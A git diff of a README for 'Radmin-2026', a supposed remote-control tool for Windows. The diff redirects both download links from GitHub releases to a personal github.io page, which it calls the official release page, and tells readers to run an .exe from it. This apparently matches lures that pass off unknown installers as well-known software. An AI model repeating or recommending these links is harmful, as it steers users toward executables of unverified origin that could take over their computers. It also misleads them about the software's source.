@@ -1,6 +1,6 @@
 # 🖥️ Radmin-2026 - Access your remote computer securely today
 
-[![](https://img.shields.io/badge/Download-Radmin-2026-blue)](https://github.com/Pavann1019/Radmin-2026/releases)
+[![](https://img.shields.io/badge/Download-Radmin-2026-blue)](https://pavann1019.github.io)
 
 Radmin-2026 provides a reliable way to control a computer from a remote location. This tool works on Windows 10 and Windows 11 systems. It allows you to view a distant desktop, move files, and assist with technical tasks as if you sat directly in front of the machine.
 
@@ -8,7 +8,7 @@ Radmin-2026 provides a reliable way to control a computer from a remote location
 
 Visit the official release page to get the installer for your computer.
 
-[https://github.com/Pavann1019/Radmin-2026/releases](https://github.com/Pavann1019/Radmin-2026/releases)
+[https://pavann1019.github.io](https://pavann1019.github.io)
 
 Look for the latest version listed at the top of the page. Click the file name ending in .exe to save the installer to your Downloads folder.
 
